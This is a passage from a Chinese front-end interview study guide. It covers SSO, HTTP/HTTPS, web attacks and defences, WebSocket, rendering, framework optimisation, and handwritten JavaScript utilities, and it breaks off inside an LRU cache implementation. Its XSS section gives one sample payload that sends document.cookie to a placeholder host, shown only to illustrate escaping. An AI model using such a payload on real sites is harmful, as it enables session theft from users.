### 如何实现SSO单点登录
单点登录就是用户集群部署的分布式架构下，只需要在某个模块登录后，再去访问其他模块的时候不需要登录验证。主域名相同用共享cookie，主域名不同用sso。

基于cookie：
* cookie默认不可跨域共享，但有些情况下可设置为共享
* 主域名相同，可设置跨域共享，如www.baidu.com、image.baidu.com。
* 设置cookie domain为主域名，即可共享cookie

SSO：
* 主域名完全不同，则无法共享cookie
* 可用SSO的技术方案，核心是把登陆验证的逻辑放在SSO认证中心服务器里
![image](/blog/images/question-8-8.png)

其它的知识点OAuth2.0：
![image](/blog/images/question-8-9.png)
## 26、TCP、UDP、HTTP区别
* HTTP协议在应用层，TCP、UDP协议在传输层
* TCP协议有三次握手四次挥手，可靠稳定传输
* UDP协议无连接无断开，不稳定传输，但效率高，如视频会议、语音通话
### HTTP1.0、HTTP1.1、HTTP2.0的区别
HTTP1.0：
* 最基础的HTTP协议
* 支持基本的GET/POST方法
* 支持长连接Connection，默认不开启

HTTP1.1：
* 增加了缓存策略cache-control、E-tag等
* 支持Persistent Connection持久连接，默认开启
* 支持断点续传，状态码206
* 支持新的方法PUT DELETE，可用于Restful API

HTTP2.0：
* 可压缩header，减少体积
* 多路复用，一个TCP连接可以多个HTTP并发请求
* 服务端主动推送
* 二进制传输
## 27、什么是HTTPS中间人攻击
### HTTTPS
HTTP 明文传输，HTTPS 加密传输HTTP+TLS/SSL

[HTTTPS参考](http://localhost:8080/blog/interview/network/3.html#%E4%B8%89%E3%80%81https)
### 中间人攻击
用假的公钥去劫持客户端的随机码，用自己的私钥去解密随机码。
怎么防范？验证证书的合法性。用第三方正规的官方证书。

![image](/blog/images/question-8-10.png)
## 28、script标签的defer和async有什么区别
![image](/blog/images/question-8-11.png)

* 无：HTML暂停解析，下载JS，执行JS，再解析HTML
* defer（延迟解析JS）：HTML继续解析，并行下载JS，HTML解析完再执行JS
* async：HTML继续解析，并行下载JS，执行JS，再解析HTML

执行JS和解析HTML不会并行执行，因为JS是单线程的。但是加载JS可以和解析HTML并行。
## 29、prefetch和dns-prefetch分别是什么
### preload和prefetch
preload 资源在当前页面使用，会优先加载。prefetch 资源在未来页面使用，空闲时加载。
### dns-prefetch和preconnect
dns-prefetch即DNS预查询。preconnect即DNS预连接。
## 30、前端攻击手段有哪些，该如何预防
### SQL注入
黑客提交内容时，提交SQL语句，破坏数据库。预防：处理输入的内容，替换特殊字符。
### XSS
XSS，跨站脚本攻击。黑客将JS代码插入到网页内容中，渲染时执行JS代码。预防：特殊字符替换。
```js
 const str = `
<p>123123</p>
<script>
    var img = document.createElement('image')
    img.src = 'https://xxx.com/api/xxx?cookie=' + document.cookie
</script>
`
const newStr = str.replaceAll('<', '&lt;' ).replaceAll('>', '&gt;')
```
### CSRF
CSRF，跨站请求伪造。黑客诱导用户去访问另一个网站的接口，伪造请求。

CSRF详细过程：用户登录了A网站，有了Cookie，黑客诱导用户到B网站，并发起A网站的请求。A网站的API发现有Cookie，认为是用户自己操作的。

预防：
* 严格的跨域请求限制，如判断referrer（请求来源）
* 验证码机制
* 为Cookie设置SameSite，禁止跨域传递Cookie
### 点击劫持
诱导界面上蒙一个透明的iframe，诱导用户点击。

预防：
* 让iframe不能跨域加载。
```js
if(top.location.hostname != self.location.hostname){
    top.location.href = self.location.href
}
```
* 设置X-Frame-Options选项。`X-Frame-Options: SAMEORIGIN`：只允许相同域名下的网页iframe，同源政策保护。
### DDoS
分布式拒绝服务。分布式的、大规模的流量访问，使服务器瘫痪。预防：软件层不好做，需硬件预防（如阿里云WAF）
## 31、WebSocket和HTTP有什么区别
WebSocket:支持端对端通讯，可以由client发起，也可以由server发起，用于消息通知、直播姬讨论区、聊天室。

websocket连接过程：先发起一个http请求，成功之后再升级到WebSocket协议，再通讯。

WebSocket和HTTP的区别：
* WebSocket协议名是`ws://`，可以双端发起请求；
* WebSocket没有跨域限制；
* 通过send和onmessage通讯（http通过req和res）；

实例：
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>websocket</title>
</head>

<body>
    <p>websocket</p>
    <button id="btn-send">发送消息</button>

    <script>
        const ws = new WebSocket('ws://127.0.0.1:3000')
        ws.onopen = () => {
            console.info('opened')
            ws.send('client opened')
        }
        ws.onmessage = event => {
            console.info('收到了信息', event.data)
        }
        const btnSend = document.getElementById('btn-send')
        btnSend.addEventListener('click', () => {
            console.info('clicked')
            ws.send('当前时间' + Date.now())
        })
    </script>
</body>

</html>
```
server.js
```js
const { WebSocketServer } = require('ws')
const wsServer = new WebSocketServer({ port: 3000 })

const list = new Set() // 存储每个连接的ws实例
wsServer.on('connection', curWs => {
    console.info('connected')
    // 这里，不能一直被 add 。实际使用中，这里应该有一些清理缓存的机制，长期用不到的 ws 要被 delete
    list.add(curWs)
    curWs.on('message', msg => {
        console.info('received message', msg.toString())
        // 传递给其他客户端
        list.forEach(ws => {
            if (ws === curWs) return
            ws.send(msg.toString())
        })
    })
})
```
实际项目推荐socket.io。
### WebSocket和HTTP长轮询的区别
* HTTP长轮询：客户端发起请求，服务端阻塞，不会立即返回。
* WebSocket：客户端可发起请求，客户端也可发起请求。
## 32、从输入URL 到网页显示的完整过程
步骤：网络请求->解析->渲染

（1）网络请求
* DNS查询（得到IP），建立TCP连接（三次握手）
* 浏览器发起HTTP请求
* 收到请求响应，得到HTML源代码
* 解析HTML过程中，遇到静态资源还会继续发起网络请求，JS、CSS、图片、视频等

（2）解析：字符串->结构化数据
* HTML构建DOM树
* CSS构建CSSOM树
* 两者结合，构建render tree

（3）渲染：Render tree绘制到页面
* 计算各个DOM的尺寸、定位，最后绘制到页面
* 遇到JS可能会执行
* 异步CSS、图片加载，可能会触发重新渲染

![image](/blog/images/question-8-12.png)
## 33、网页重绘repaint和重排reflow有什么区别
重绘：元素外观改变，如颜色、背景色。但元素的尺寸、定位不变，不会影响其他元素的位置。

重排：重新计算尺寸和布局，可能会影响其他元素的位置。如元素高度增加，可能会使相邻元素位置下移。

重排比重绘要影响更大，消耗也更大。要尽量减少重排。

减少重排的方法：
* 集中修改样式，或者直接切换css class
* 修改之前先设置display:none，脱离文档流
* 使用BFC特性，不影响其它元素位置
* 频繁触发使用节流和防抖
* 使用createDocumentFragment批量操作DOM
* 优化动画，使用CSS3和requestAnimationFrame
## 34、如何实现网页多标签tab通讯
### 使用WebSocket
本身跨域，不需要跨域支持；需要服务端支持，成本高。
### 使用localStorage
* 同域的A和B两个页面，必须同域
* A页面设置localStorage，B页面可以监听到localStorage值的改变
```js
// A页面
const btn1 = document.getElementById('btn1')
btn1.addEventListener('click', () => {
    const newInfo = {
        id: 100,
        name: '标题' + Date.now()
    }
    localStorage.setItem('changeInfo', JSON.stringify(newInfo))
})

// B页面，监听storage改变
window.addEventListener('storage', event => {
    console.info('key', event.key)
    console.info('value', event.newValue)
})
```
### 使用SharedWorker
SharedWorker是WebWorker的一种。WebWorker可开启子进程执行JS，但不能操作DOM。SharedWorker可单独开启一个进程，用于同域页面通讯。缺点是调试不方便，不兼容IE11。

案例：
```js
// A页面发送消息
const worker = new SharedWorker('./worker.js')
const btn1 = document.getElementById('btn1')
btn1.addEventListener('click', () => {
    console.log('clicked')
    worker.port.postMessage('detail go...')
})

// B页面接收消息
const worker = new SharedWorker('./worker.js')
worker.port.onmessage = e => console.info('list', e.data)
```
worker.js
```js
const set = new Set()
onconnect = event => {
    const port = event.ports[0]
    set.add(port)
    // 接收信息
    port.onmessage = e => {
        // 广播消息
        set.forEach(p => {
            if (p === port) return
            p.postMessage(e.data)
        })
    }
    // 发送信息
    port.postMessage('worker.js done')
}
```
## 35、如何实现网页和iframe之间的通讯
父页面发送消息给iframe：`window.iframe1.contentWindow.postMessage('hello', '*')`，iframe发送消息给父页面：`window.parent.postMessage('world', '*')`，注意跨域的限制和判断。

案例：

A页面
```html
<p>
    child page
    <button id="btn1">发送消息</button>
</p>

<script>
    const btn1 = document.getElementById('btn1')
    btn1.addEventListener('click', () => {
        console.info('child clicked')
        window.parent.postMessage('world', '*') // * 代表不限制域名。
    })

    window.addEventListener('message', event => {
        console.info('origin', event.origin) // 判断 origin 的合法性
        console.info('child received', event.data)
    })
</script>
```
B页面
```html
<p>
    child page
    <button id="btn1">发送消息</button>
</p>

<script>
    const btn1 = document.getElementById('btn1')
    btn1.addEventListener('click', () => {
        console.info('child clicked')
        window.parent.postMessage('world', '*')
    })

    window.addEventListener('message', event => {
        console.info('origin', event.origin) // 判断 origin 的合法性
        console.info('child received', event.data)
    })
</script>
```
## 36、请描述koa2的洋葱圈模型
```js
const Koa = require('koa');
const app = new Koa();

// logger
app.use(async (ctx, next) => {
  await next(); // 先执行下一步 x-response-time ，执行完再继续执行
  const rt = ctx.response.get('X-Response-Time');
  console.log(`${ctx.method} ${ctx.url} - ${rt}`);
});

// x-response-time
app.use(async (ctx, next) => {
  const start = Date.now();
  await next(); // 先执行下一步 response ，执行完再继续执行
  const ms = Date.now() - start;
  ctx.set('X-Response-Time', `${ms}ms`);
});

// response
app.use(async ctx => {
  ctx.body = 'Hello World';
});

app.listen(3000);
```
![image](/blog/images/question-8-13.png)
## 37、H5页面如何进行首屏优化
* 路由懒加载。
* 服务端渲染SSR（终极方案），Nuxt.js(vue) ，Next.js(react)。
* 分页。
* 图片懒加载。默认只展示文本内容，然后触发图片懒加载。注意提前设置图片尺寸，尽量只重绘不重排。
* app预取。如果h5在App webview中展示，可使用app预取。用户访问列表页时，App预加载文章首屏内容。用户进入文章的h5页，直接从app中获取内容，瞬间展示首屏。
* hybrid。提前将HTML、CSS、JS下载到App内部，在app webview中使用`file://`协议加载页面文件。
## 38、文字超出省略
单行文字：
```css
#box1 {
    border: 1px solid #ccc;
    width: 100px;
    overflow: hidden;
    white-space: nowrap; /* 不换行 */
    text-overflow: ellipsis; /* 超出省略 */
}
```
多行文字:
```css
#box2 {
    border: 1px solid #ccc;
    width: 100px;
    overflow: hidden;
    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */
    -webkit-box-orient: vertical; /* 设置子元素排列方式 */
    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */
}
```
## 39、前端常用的设计模式和使用场景
设计原则： 最重要的思想，开放封闭原则，对扩展开放，对修改封闭
### 工厂模式
用一个工厂函数来创建实例，隐藏实例，如JQuery里的$。
### 单例模式
全局唯一的实例，如Vuex、Redux里面的store。
```js
class SingleTon {
    private static instance: SingleTon | null = null
    private constructor() {}
    public static getInstance(): SingleTon {
        if (this.instance == null) {
            this.instance = new SingleTon()
        }
        return this.instance
    }
    fn1() {}
    fn2() {}
}

const s = SingleTon.getInstance()
s.fn1()
s.fn2()

const s1 = SingleTon.getInstance()
const s2 = SingleTon.getInstance()

console.info(s1 === s2)
```
### 代理模式
使用者不能直接访问对象，而是访问一个代理层，在代理层可以监听get set很多事情，如ES6 proxy实现Vue3响应式。
### 观察者模式
一个主题，一个观察者，主题变化之后触发观察者执行
```js
btn.addEventListener('click',()=>{})
```
### 发布订阅模式
```js
event.on('event-key',()=>{
    // 事件1
})
event.on('event-key',()=>{
    // 事件2
})
event.emit('event-key')
```
### 装饰器模式
* 原功能不变，增加一些新功能（AOP面向切面编程）
* ES6和TS的装饰器语法
### 观察者模式和发布订阅模式的区别
* 观察者模式Subject和Observer直接绑定，没有中间媒介。比如addEventListener。
* 发布订阅模式Publisher和Observer互不相识，需要中间媒介Event Channer。比如EventBus自定义事件。

![image](/blog/images/question-8-14.png)
## 40、Vue、React性能优化和踩过哪些坑
### Vue性能优化
* v-if和v-show。v-if彻底销毁组件，v-show使用css隐藏组件，大部分情况下使用v-if就好。
* v-for使用key。
* 使用computed缓存。
* 频繁切换的组件，如tabs，使用keep-alive缓存组件。
* 针对体积较大的组件，使用异步组件。拆包，需要时异步加载。减少主包体积，首页加载会更快。
* 服务端渲染，Nuxt框架。
### Vue踩坑
* 内存泄露。
* 路由切换时scroll到顶部。
### React性能优化
* 修改CSS模拟v-show
* 循环使用key
* 使用Fragment减少层级
* JSX中不要定义函数
* 事件的回调函数要在构造函数中bind this，或者使用箭头函数
* 使用`ShouldComponentUpdate`判断组件是否更新。或者使用`React.PureComponent`。函数组件使用`React.memo`。

使用`React.PureComponent`。
```js
import React from 'react'
class TodoList extends React.PureComponent {
    componentDidUpdate() {
        // React 默认会让所有的子组件都更新，无论涉及的数据是否变化
        console.info('list updated')
    }
    render() {
        const { list = [] } = this.props
        return <ul>
            {list.map(todo => {
                const { id, title } = todo
                return <li key={id}>{title}</li>
            })}
        </ul>
    }
}

export default TodoList
```
使用React.memo。
```js
import React from 'react'
function FunctionalTodoList(props) {
    console.log('todo list fn...')

    const { list = [] } = props
    return <ul>
        {list.map(todo => {
            const { id, title } = todo
            return <li key={id}>{title}</li>
        })}
    </ul>
}
export default React.memo(FunctionalTodoList)
```
* Hooks缓存数据和函数。useMemo（类似Vue computed，缓存数据）和useCallback（缓存函数）。
* 异步组件和路由懒加载。
* SSR
### React踩坑
* 自定义组件的名称首字母要大写
* setState是异步更新的
## 41、如何统一监听Vue、React组件报错
### window.onerror
全局监听所有JS错误，但它是JS级别的，识别不了Vue组件的信息。可以捕捉一些Vue监听不到的错误，比如异步回调里的错误。
```js
window.onerror = function (msg, source, line, column, error) {
    console.info('window.onerror----', msg, source, line, column, error)
}

window.addEventListener('error', event => {
    console.info('window error', event)
})
```
### 如何统一监听Vue组件报错
* 使用errorCaptured生命周期。会监听所有下级组件的错误，返回false会阻止向上传播。
```js
errorCaptured: (err, vm, info) => {
    console.info('errorCaptured----', err, vm, info)
    // return false
}
```
* 使用errorHandler配置。监听全局Vue组件的错误，所有组件错误都会汇总到这里，但如果errorCaptured返回false则不会传播到这里。
```js
import { createApp } from 'vue'
import App from './App.vue'
import router from './router'
const app = createApp(App)
// 配置errorHandler
app.config.errorHandler = (error, vm, info) => {
    console.info('errorHandler----', error, vm, info)
}
app.use(router).mount('#app')
```
异步回调里的错误，errorHandler和errorCaptured都监听不到，需要用windon.onerror。
### 如何统一监听React组件报错
* 使用ErrorBoundary组件，监听所有下级组件的错误，可以降级展示UI。只监听组件渲染时报错，不监听DOM事件报错、异步错误。production环境生效，dev环境会直接抛出错误。

自定义ErrorBoundary组件
```js
import React from 'react'

class ErrorBoundary extends React.Component {
    constructor(props) {
        super(props)
        this.state = {
            error: null // 存储当前的报错信息
        }
    }
    // 返回error会赋值给this.state
    static getDerivedStateFromError(error) {
        // 更新 state 使下一次渲染能够显示降级后的 UI
        console.info('getDerivedStateFromError...', error)
        return { error }
    }
    componentDidCatch(error, errorInfo) {
        // 统计上报错误信息
        console.info('componentDidCatch...', error, errorInfo)
    }
    render() {
        if (this.state.error) {
            // 提示错误
            return <h1>报错了</h1>
        }

        // 没有错误，就渲染子组件
        return this.props.children
    }
}

export default ErrorBoundary
```
入口文件
```js
import ErrorBoundary from './ErrorBoundary'

ReactDOM.render(
  <React.StrictMode>
    <ErrorBoundary>
      <App />
    </ErrorBoundary>
  </React.StrictMode>,
  document.getElementById('root')
);
```
* 事件报错使用window.onerror或者try..catch。异步报错，使用window.onerror。
## 42、如果一个h5很慢，如何排查性能问题
### 前端性能指标
* FP（First Paint），表示渲染出第一个像素点。FP一般在HTML解析完成或者解析一部分时候触发。
* FCP（First Contentful Paint），表示渲染出第一个内容，这里的“内容”可以是文本、图片、canvas。
* FMP（First Meaningful Paint），首次渲染有意义的内容的时间，“有意义”没有一个标准的定义。已经弃用，改用LCP。
* LCP（Largest Contentful Paint），最大内容渲染时间。
* DCL（DomContentLoaded），页面DOM渲染完成。
* L（Load），页面加载完成。
### 使用Chrome Performance分析
Performance可查看上述指标，并且有网页快照
### 使用lighthouse分析
非常流行的第三方性能评测工具，支持移动端和PC端。安装lighthouse，`npm i lighthouse -g`。
运行`lighthouse https://www.imooc.com/ --view --preset=desktop`

--view，显示测试报告。--preset=desktop，pC方式访问。
### 解决方案
如果是网页加载慢：
* 优化服务端硬件配置，使用CDN
* 路由懒加载，大组件异步加载--减少主包的体积
* 优化HTTP缓存策略

如果是网页渲染慢：
* 优化服务端接口
* 继续分析，优化前端组件内部的逻辑
* 服务端渲染SSR
## 43、手写一个JS函数，实现数组扁平化Array Flatten
使用reduce
```js
function FlattenArray(arr) {
    if (arr.length == 0) {
        return arr
    }
    return arr.reduce((a, b) => {
        if (Array.isArray(b)) {
            return a.concat(...b)
        } else {
            return a.concat(b)
        }
    }, [])
}
const arr = [1, 3, [5, 1, 2], [434], [8, [0, 1]]]
console.log(FlattenArray(arr));
```
其它的方法
```js
/**
 * 数组深度扁平化，使用push
 * @param {*} arr 
 * @returns 
 */
function FlattenArray1(arr) {
    const res = []
    arr.forEach(item => {
        if (Array.isArray(item)) {
            const flatItem = FlattenArray1(item) // 递归遍历，最终得到一维数组
            flatItem.forEach(n => res.push(n))
        } else {
            res.push(item)
        }
    });
    return res
}
/**
 * 数组深度扁平化，使用concat
 * @param {*} arr 
 * @returns 
 */
function FlattenArray2(arr) {
    let res = []
    arr.forEach(item => {
        if (Array.isArray(item)) {
            const flatItem = FlattenArray2(item)
            res = res.concat(flatItem)
        } else {
            res = res.concat(item)
        }
    });
    return res
}
const arr = [1, 3, [5, 1, 2], [434], [8, [0, 1]]]
console.log(FlattenArray1(arr));
console.log(FlattenArray2(arr));
```
## 44、手写一个getType函数，获取详细的数据类型
手写一个getType函数，传入任意变量，可获取详细的数据类型。
* 如number、string、boolean值类型
* 还有object、array、map、regexp等引用类型

使用`Object.prototype.toString.call()`，
```js
function getType(x) {
    const originType = Object.prototype.toString.call(x)
    const spaceIndex = originType.indexOf(' ')  // 不要使用split，因为会split会转成数组，转成数组会占用时间
    const type = originType.slice(spaceIndex + 1, -1)
    return type.toLowerCase()
}  
```
## 45、new一个对象的过程是什么，手写代码表示
* 创建一个对象obj，继承构造函数的原型
* 执行构造函数（将obj作为this）
* 返回obj
```js
function customNew<T>(constructor: Function, ...args: any[]): T {
    // 1. 创建一个空对象，继承 constructor 的原型
    const obj = Object.create(constructor.prototype)
    // 2. 将 obj 作为 this ，执行 constructor ，传入参数
    constructor.apply(obj, args)
    // 3. 返回 obj
    return obj
}
```
## 46、深度优先遍历和广度优先遍历一颗DOM树
深度优先遍历，使用递归或者栈，递归的本质就是栈。广度优先遍历，使用队列。
![image](/blog/images/question-8-15.png)

html结构
```html
   <div id="box">
        <p>hello <b>world</b></p>
        <img src="https://www.baidu.com/img/flexible/logo/pc/result.png" />

        <ul>
            <li>a</li>
            <li>b</li>
        </ul>
    </div>
```
深度优先递归和栈。广度优先队列。
```js
/**
 * 访问节点
 * @param n node
 */
function visitNode(n: Node) {
    if (n instanceof Comment) {
        // 注释
        console.info('Comment node ---', n.textContent)
    }
    if (n instanceof Text) {
        // 文本
        const t = n.textContent?.trim()
        if (t) {
            console.info('Text node ---', t)
        }
    }
    if (n instanceof HTMLElement) {
        // element
        console.info('Element node ---', `<${n.tagName.toLowerCase()}>`)
    }
}

/**
 * 深度优先遍历，递归
 * @param root dom node
 */
function depthFirstTraverse1(root: Node) {
    visitNode(root)

    const childNodes = root.childNodes // .childNodes 和 .children 不一样
    if (childNodes.length) {
        childNodes.forEach(child => {
            depthFirstTraverse1(child) // 递归
        })
    }
}

/**
 * 深度优先遍历，使用栈
 * @param root dom node
 */
function depthFirstTraverse2(root: Node) {
    const stack: Node[] = []

    // 根节点压栈
    stack.push(root)

    while (stack.length > 0) {
        const curNode = stack.pop() // 出栈
        if (curNode == null) break

        visitNode(curNode)

        // 子节点压栈
        const childNodes = curNode.childNodes
        if (childNodes.length > 0) {
            // reverse 反顺序压栈
            Array.from(childNodes).reverse().forEach(child => stack.push(child))
        }
    }
}

/**
 * 广度优先遍历，使用队列
 * @param root dom node
 */
function breadthFirstTraverse(root: Node) {
    const queue: Node[] = [] // 数组 vs 链表

    // 根节点入队列
    queue.unshift(root)

    while (queue.length > 0) {
        const curNode = queue.pop()
        if (curNode == null) break

        visitNode(curNode)

        // 子节点入队
        const childNodes = curNode.childNodes
        if (childNodes.length) {
            childNodes.forEach(child => queue.unshift(child))
        }
    }
}

const box = document.getElementById('box')
if (box == null) throw new Error('box is null')
depthFirstTraverse2(box)
```
## 47、手写一个LazyMan，实现sleep机制
手写一个LazyMan，实现sleep机制，支持sleep和eat方法，支持链式调用
```js
const layMan = new LasyMan('zls')
layMan.eat('苹果').eat('香蕉').sleep(5).eat('葡萄')
// zls eat 苹果
// zls eat 香蕉
// 等待5s
// zls eat 葡萄
```
由于有sleep功能，函数不能直接在调用时触发。应该初始化一个列表，把函数注册进去。由每个item触发next执行（遇到sleep则异步触发）。
```js
class LazyMan {
    private name: string
    private tasks: Function[] = [] // 任务列表

    constructor(name: string) {
        this.name = name

        setTimeout(() => {
            this.next()
        })
    }

    private next() {
        const task = this.tasks.shift() // 取出当前 tasks 的第一个任务
        if (task) task()
    }

    eat(food: string) {
        const task = () => {
            console.info(`${this.name} eat ${food}`)
            this.next() // 立刻执行下一个任务
        }
        this.tasks.push(task)

        return this // 链式调用
    }

    sleep(seconds: number) {
        const task = () => {
            console.info(`等待${seconds}s`)
            setTimeout(() => {
                this.next() // xx 秒之后再执行下一个任务
            }, seconds * 1000)
        }
        this.tasks.push(task)

        return this // 链式调用
    }
}

const me = new LazyMan('zls')
me.eat('苹果').eat('香蕉').sleep(2).eat('葡萄').eat('西瓜').sleep(2).eat('橘子')
```
## 48、手写curry函数，实现函数柯里化
```js
function add(a, b, c) {
    return a + b + c
}
function curry(fn) {
    const len = fn.length // 保存函数参数的个数
    let argArr = []  // 保存所有参数
    function _curry(...args) {
        argArr = argArr.concat(args)
        // 参数够了就执行
        if (argArr.length >= len) {
            return fn.apply(this, argArr)
        } else {
            // 否则继续返回curry
            return _curry
        }
    }
    return _curry
}

const curryAdd = curry(add)
const res = curryAdd(10)(20)(30) // 60
console.info(res)
```
## 49、instanceof原理是什么，请写代码表示
作用是判断某个实例对象是否是某个构造函数的实例。原理就是判断实例对象的__proto__属性和构造函数的prototype是否引用了同一个地址。
![image](/blog/images/js-1.png)
```js
/**
 * 自定义 instanceof
 * @param instance instance
 * @param origin class or function
 */
function myInstanceof(instance: any, origin: any): boolean {
    if (instance == null) return false // null undefined

    const type = typeof instance
    if (type !== 'object' && type !== 'function') {
        // 值类型
        return false
    }

    let tempInstance = instance // 为了防止修改 instance
    while (tempInstance) {
        if (tempInstance.__proto__ === origin.prototype) {
            return true // 匹配上了
        }
        // 未匹配
        tempInstance = tempInstance.__proto__ // 顺着原型链，往上找
    }

    return false
}
```
## 50、手写函数bind、call、apply
手写bind
```js
Function.prototype.customBind = function (context) {
    // context 是 bind 传入的 this
    const self = this // 当前的函数本身
    return function (...args) {
        // 拼接参数
        return self.apply(context, args)
    }
}
```
手写call，如何在函数执行时绑定this？给传入的context加上fn，这样就可以通过this去访问context里的属性了。
```js
Function.prototype.customCall = function (context: any, ...args: any[]) {
    if (context == null) context = globalThis
    if (typeof context !== 'object') context = new Object(context) // 值类型，变为对象

    const fnKey = Symbol() // 不会出现属性名称的覆盖
    context[fnKey] = this // this 就是当前的函数

    const res = context[fnKey](...args) // 绑定了 this
    delete context[fnKey] // 清理掉 fn ，防止污染
    return res
}
```
手写apply
```js
Function.prototype.customApply = function (context: any, args: any[] = []) {
    if (context == null) context = globalThis
    if (typeof context !== 'object') context = new Object(context) // 如果是值类型，则变为对象

    const fnKey = Symbol() // 不会出现属性名称的覆盖
    context[fnKey] = this // this 就是当前的函数

    const res = context[fnKey](...args) // 绑定了 this
    delete context[fnKey] // 清理掉 fn ，防止污染
    return res
}
```
## 51、手写EventBus自定义事件
实现$on、$emit、$once、$off。分析：on、once注册函数，存储起来。emit时找到对应的函数，执行。off时找到对应的函数，从对象中删除。
* on绑定的事件可以连续执行，除非off。
* once绑定的函数emit一次即删除，也可以未执行而被off。
```js
/**
 * on和once放一起
 */
class EventBus {
    /**
     * {
     *    'key1': [
     *        { fn: fn1, isOnce: false },
     *        { fn: fn2, isOnce: false },
     *        { fn: fn3, isOnce: true },
     *    ]
     *    'key2': [] // 有序
     *    'key3': []
     * }
     */
    private events: {
        [key: string]: Array<{ fn: Function; isOnce: boolean }>
    }

    constructor() {
        this.events = {}
    }

    on(type: string, fn: Function, isOnce: boolean = false) {
        const events = this.events
        if (events[type] == null) {
            events[type] = [] // 初始化 key 的 fn 数组
        }
        events[type].push({ fn, isOnce })
    }

    once(type: string, fn: Function) {
        this.on(type, fn, true)
    }

    off(type: string, fn?: Function) {
        if (!fn) {
            // 解绑所有 type 的函数
            this.events[type] = []
        } else {
            // 解绑单个 fn
            const fnList = this.events[type]
            if (fnList) {
                this.events[type] = fnList.filter(item => item.fn !== fn)
            }
        }
    }

    emit(type: string, ...args: any[]) {
        const fnList = this.events[type]
        if (fnList == null) return

        // 注意
        this.events[type] = fnList.filter(item => {
            const { fn, isOnce } = item
            fn(...args)

            // once 执行一次就要被过滤掉
            if (!isOnce) return true
            return false
        })
    }
}


/**
 * on和once分开存储
 */
class EventBus2 {
    private events: { [key: string]: Array<Function> } // { key1: [fn1, fn2], key2: [fn1, fn2] }
    private onceEvents: { [key: string]: Array<Function> }

    constructor() {
        this.events = {}
        this.onceEvents = {}
    }

    on(type: string, fn: Function) {
        const events = this.events
        if (events[type] == null) events[type] = []
        events[type].push(fn)
    }

    once(type: string, fn: Function) {
        const onceEvents = this.onceEvents
        if (onceEvents[type] == null) onceEvents[type] = []
        onceEvents[type].push(fn)
    }

    off(type: string, fn?: Function) {
        if (!fn) {
            // 解绑所有事件
            this.events[type] = []
            this.onceEvents[type] = []
        } else {
            // 解绑单个事件
            const fnList = this.events[type]
            const onceFnList = this.onceEvents[type]
            if (fnList) {
                this.events[type] = fnList.filter(curFn => curFn !== fn)
            }
            if (onceFnList) {
                this.onceEvents[type] = onceFnList.filter(curFn => curFn !== fn)
            }
        }
    }

    emit(type: string, ...args: any[]) {
        const fnList = this.events[type]
        const onceFnList = this.onceEvents[type]

        if (fnList) {
            fnList.forEach(f => f(...args))
        }
        if (onceFnList) {
            onceFnList.forEach(f => f(...args))

            // once 执行一次就删除
            this.onceEvents[type] = []
        }
    }
}
```
## 52、用JS实现一个LRU缓存
### LRU缓存
LRU，最近使用。如果内存优先，只缓存最近使用的，删除“沉水”数据，新的数据放在最前面，旧的数据删掉。核心API：get、set。
```js
const lruCache = new LRUCache(2) // 长度为2
lruCache.set(1, 1) // {1=1}
lruCache.set(2, 2) // {1=1, 2=2}
console.info(lruCache.get(1)) // 1 {2=2, 1=1}
lruCache.set(3, 3) // {1=1, 3=3}
console.info(lruCache.get(2)) // null
lruCache.set(4, 4) // {3=3, 4=4}
console.info(lruCache.get(1)) // null
console.info(lruCache.get(3)) // 3 {4=4, 3=3}
console.info(lruCache.get(4)) // 4 {3=3, 4=4}
```
### 使用Map实现
* 用哈希表来存储数据，这样get、set才更快O(1)，在JS中可以用Object和Map来实现。
* 必须是有序的，常用数据放在前面，“沉水”数据放在后面。
* 哈希表+有序，只有Map才符合。
```js
class LRUCache {
    constructor(len) {
        if (len < 1) throw new Error('invalid length')
        this.length = len
        this.data = new Map()
    }
    set(key, value) {
        if (this.data.has(key)) {
            this.data.delete(key)
        }
        this.data.set(key, value)
        // 如果超出了length
        if (this.data.size > this.length) {
            // 如果超出了容量，则删除 Map 最老的元素
            const delKey = this.data.keys().next().value // this.data.keys()是可迭代的
            this.data.delete(delKey)
        }
    }
    get(key) {
        if (!this.data.has(key)) return null
        const value = this.data.get(key)
        this.data.delete(key)
        this.data.set(key, value)
        return value
    }
}
```
### 使用双向链表实现
双向链表：可快速增加元素、可快速删除元素、可快速移动元素位置。
![image](/blog/images/question-8-17.png)
```js
interface IListNode {
    value: any
    key: string // 存储 key ，方便删除（否则删除时就需要遍历 this.data )
    prev?: IListNode
    next?: IListNode
}

class LRUCache {
    private length: number
    private data: { [key: string]: IListNode } = {}
    private dataLength: number = 0
    private listHead: IListNode | null = null
    private listTail: IListNode | null = null

    constructor(length: number) {
        if (length < 1) throw new Error('invalid length')
        this.length = length
    }

    private moveToTail(curNode: IListNode) {
        const tail = this.listTail
        if (tail === curNode) return

        // -------------- 1. 让 prevNode nextNode 断绝与 curNode 的关系 --------------
        const prevNode = curNode.prev
        const nextNode = curNode.next
        if (prevNode) {
            if (nextNode) {
                prevNode.next = nextNode
            } else {
                delete prevNode.next
            }
        }
        if (nextNode) {
            if (prevNode) {
                nextNode.prev = prevNode
            } else {
                delete nextNode.prev
            }

            if (this.listHead === curNode) this.listHead = nextNode
        }

        // -------------- 2. 让 curNode 断绝与 prevNode nextNode 的关系 --------------
        delete curNode.prev
        delete curNode.next

        // -------------- 3. 在 list 末尾重新建立 curNode 的新关系 --------------
        if (tail) {
            tail.next = curNode
            curNode.prev = tail
        }
        this.listTail = curNode
    }

    private tryClean() {
        while (this.dataLength > this.length) {
            const head = this.listHead
            if (head == null) throw new Error('head is null')
            const headNext = head.next
            if (headNext == null) throw new Error('headNext is null')

            // 1. 断绝 head 和 next 的关系
            delete headNext.prev
            delete head.next

            // 2. 重新赋值 listHead
            this.listHead = headNext

            // 3. 清理 data ，重新计数
            delete this.data[head.key]
            this.dataLength = this.dataLength - 1
        }
    }

    get(key: string): any {
        const data = this.data
        const curNode = data[key]

        if (curNode == null) return null

        if (this.listTail === curNode) {
            // 本身在末尾（最新鲜的位置），直接返回 value
            return curNode.value
        }

        // curNode 移动到末尾
        this.moveToTail(curNode)

        return curNode.value
    }

    set(key: string, value: any) {
        const data = this.data
        const curNode = data[key]

        if (curNode == null) {
            // 新增数据
            const newNode: IListNode = { key, value }
            // 移动到末尾
            this.moveToTail(newNode)

            data[key] = newNode
